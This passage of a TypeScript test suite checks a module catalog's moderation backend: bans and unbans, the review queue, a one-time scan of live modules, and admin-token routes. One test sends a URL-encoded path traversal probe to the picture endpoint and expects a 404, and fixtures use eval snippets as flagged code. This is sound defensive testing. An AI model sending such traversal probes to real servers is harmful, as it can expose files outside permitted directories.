    await post("/ban", { accountId: dev.accountId, reason: "spam" });
    const fingerprint = store.keys(dev.accountId)[0]!.fingerprint;
    const publicKey = store.publisherKey(fingerprint)!.publicKey;
    store.deleteAccount(dev.accountId);
    const fresh = store.createAccount({ email: "new@example.com" }, Date.now());
    expect(store.linkKey(fresh.id, fingerprint, publicKey, Date.now())).toBe("taken");
    expect(store.isBanned(dev.accountId)).toBe(true);
  });

  it("can be undone: only the modules the ban unlisted come back, and the developer publishes again", async () => {
    const { developer, send, post, catalog, store, answer } = setup({ scanner: undefined });
    const dev = developer("dev@example.com");
    await send(dev.key, moduleZip(dev.key, { id: "wellbrained.a", name: "A" }));
    await post("/approve", { sha256: catalog.waitingVersions()[0]!.sha256 });
    await send(dev.key, moduleZip(dev.key, { id: "wellbrained.b", name: "B" }));
    await post("/approve", { sha256: catalog.waitingVersions()[0]!.sha256 });
    // The maintainer delisted B earlier, for another reason.
    catalog.setListed("wellbrained.b", false);
    await post("/ban", { accountId: dev.accountId, reason: "spam" });
    expect(store.bans()).toHaveLength(1);
    expect(await answer(await post("/unban", { accountId: dev.accountId }))).toMatchObject({ http: 200, relisted: ["wellbrained.a"] });
    expect(catalog.index().map((entry) => entry.id)).toEqual(["wellbrained.a"]);
    expect(store.isBanned(dev.accountId)).toBe(false);
    expect((await send(dev.key, moduleZip(dev.key, { id: "wellbrained.a", name: "A", version: "1.1.0" }))).status).not.toBe(403);
    expect((await post("/unban", { accountId: dev.accountId })).status).toBe(404);
  });

  it("takes a ban from a waiting version's hash, and refuses a bad reason or an unknown developer", async () => {
    const { developer, send, post, catalog, store } = setup({ scanner: undefined });
    const dev = developer("dev@example.com");
    await send(dev.key, moduleZip(dev.key));
    const sha256 = catalog.waitingVersions()[0]!.sha256;
    expect((await post("/ban", { sha256, reason: "nope" })).status).toBe(400);
    expect((await post("/ban", { reason: "spam" })).status).toBe(400);
    expect((await post("/ban", { accountId: "nobody", reason: "spam" })).status).toBe(404);
    expect((await post("/ban", { sha256, reason: "hateful" })).status).toBe(200);
    expect(store.isBanned(dev.accountId)).toBe(true);
    expect((await post("/ban", { sha256, reason: "hateful" })).status).toBe(404);
    expect((await post("/ban", { accountId: dev.accountId, reason: "hateful" })).status).toBe(409);
  });
});

describe("the waiting list for the maintainer", () => {
  it("shows reasons, the developer and what helps judge the version", async () => {
    const { developer, send, get } = setup({ scanner: undefined });
    const fresh = developer("fresh@example.com", false);
    const zip = moduleZip(fresh.key, { network: ["api.example.com"], description: "A timer", readme: "# Timer\n\nHello", notes: ["First"], icon: picture(3), extra: [{ name: "app.js", data: Buffer.from("eval(1)") }] });
    await send(fresh.key, zip);
    const body = (await (await get("/waiting")).json()) as { waiting: Record<string, any>[]; reasons: string[] };
    expect(body.reasons).toEqual(["unsafe", "hateful", "adult", "spam", "broken"]);
    const item = body.waiting[0]!;
    expect(item).toMatchObject({ id: "wellbrained.timer", name: "Timer", version: "1.0.0", previousVersion: null });
    expect(item.reasons.map((reason: { check: string }) => reason.check).sort()).toEqual(["code", "first-module", "permissions", "pictures", "virus"]);
    expect(item.reasons.find((reason: { check: string }) => reason.check === "code").detail).toContain("app.js");
    expect(item.developer).toMatchObject({ name: "dev-fresh", email: "fresh@example.com", approvedBefore: false, banned: false, prefixes: ["wellbrained"] });
    expect(item.module).toMatchObject({ description: "A timer", readme: "# Timer\n\nHello", notes: ["First"], permissions: { network: ["api.example.com"], connectors: [] } });
    expect(item.module.files.map((file: { name: string }) => file.name)).toContain("app.js");
    expect(item.module.pictures).toHaveLength(1);

    const picture1 = item.module.pictures[0];
    const image = await get(`/pictures/${picture1.sha256}.${picture1.type}`);
    expect(image.status).toBe(200);
    expect(image.headers.get("content-type")).toBe("image/png");
    expect((await get(`/pictures/${"0".repeat(64)}.png`)).status).toBe(404);
    expect((await get("/pictures/..%2f..%2fx.png")).status).toBe(404);

    const file = await get(`/waiting/${item.sha256}/file?name=app.js`);
    expect(await file.text()).toBe("eval(1)");
    expect(file.headers.get("content-type")).toContain("text/plain");
    expect((await get(`/waiting/${item.sha256}/file?name=nope.js`)).status).toBe(404);
    expect((await get(`/waiting/${"0".repeat(64)}/file?name=app.js`)).status).toBe(404);
  });
});

describe("the one-time run of the checks over what is live", () => {
  it("shows results only: nothing is delisted, approved or changed, and it runs once unless asked again", async () => {
    const { developer, send, post, get, catalog } = setup();
    const dev = developer("dev@example.com");
    // Live: one clean module, one that would be held (it has eval), added by hand like the modules before the review.
    expect((await send(dev.key, moduleZip(dev.key, { id: "wellbrained.good", name: "Good" }))).status).toBe(201);
    catalog.add(moduleZip(dev.key, { id: "wellbrained.risky", name: "Risky", extra: [{ name: "a.js", data: Buffer.from("new Function('x')") }] }));
    const before = JSON.stringify([catalog.index(), catalog.modules()]);
    const response = await post("/live-check", {});
    expect(response.status).toBe(200);
    const { result } = (await response.json()) as { result: { checked: number; skipped: number; flagged: number; results: { id: string; reasons: { check: string }[] }[] } };
    expect(result).toMatchObject({ checked: 2, skipped: 0, flagged: 1 });
    expect(result.results.find((item) => item.id === "wellbrained.risky")!.reasons.map((reason) => reason.check)).toEqual(["code"]);
    expect(result.results.find((item) => item.id === "wellbrained.good")!.reasons).toEqual([]);
    expect(JSON.stringify([catalog.index(), catalog.modules()])).toBe(before);
    expect(catalog.waitingVersions()).toEqual([]);
    // Once: asking again is refused unless `again`, and the results stay readable.
    expect((await post("/live-check", {})).status).toBe(409);
    expect(((await (await get("/live-check")).json()) as { result: { checked: number } }).result.checked).toBe(2);
    expect((await post("/live-check", { again: true })).status).toBe(200);
  });

  it("counts a scan that could not run as a result, not a pass", async () => {
    const { developer, post, catalog } = setup({ scanner: undefined });
    const dev = developer("dev@example.com");
    catalog.add(moduleZip(dev.key, { id: "wellbrained.good", name: "Good" }));
    const { result } = (await (await post("/live-check", {})).json()) as { result: { flagged: number; results: { reasons: { check: string }[] }[] } };
    expect(result.flagged).toBe(1);
    expect(result.results[0]!.reasons.map((reason) => reason.check)).toEqual(["virus"]);
  });

  it("compares a module to its own earlier version, not to itself", async () => {
    const { developer, post, catalog } = setup();
    const dev = developer("dev@example.com");
    catalog.add(moduleZip(dev.key, { id: "wellbrained.good", name: "Good", version: "1.0.0", network: ["a.example.com"] }));
    catalog.add(moduleZip(dev.key, { id: "wellbrained.good", name: "Good", version: "1.1.0", network: ["a.example.com"] }));
    const { result } = (await (await post("/live-check", {})).json()) as { result: { flagged: number } };
    expect(result.flagged).toBe(0);
  });
});

describe("the admin app", () => {
  it("serves the moderation routes only with the admin token", async () => {
    const store = new AccountStore(":memory:");
    const catalog = new CatalogStore(mkdtempSync(path.join(tmpdir(), "tavora-moderation-")));
    const state = new IconState(":memory:");
    const icons = createHostedStore({ list: () => [], file: () => null }, state);
    const submissions = createSubmissions({ state, store: icons, gameName: () => null, gamesNamed: () => [] });
    const token = "t0ken-".repeat(5);
    const app = createAdminApp({ token, submissions, state, store: icons, catalog, accounts: store, moderation: {} });
    expect((await app.request("http://admin.test/api/moderation/waiting")).status).toBe(401);
    expect((await app.request("http://admin.test/api/moderation/approve", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" })).status).toBe(401);
    const ok = await app.request("http://admin.test/api/moderation/waiting", { headers: { "x-admin-token": token } });
    expect(ok.status).toBe(200);
    expect(ok.headers.get("cache-control")).toBe("no-store");
    expect(await ok.json()).toMatchObject({ waiting: [] });
    const wrongType = await app.request("http://admin.test/api/moderation/approve", { method: "POST", headers: { "x-admin-token": token, "content-type": "text/plain" }, body: "{}" });
    expect(wrongType.status).toBe(415);
  });
});
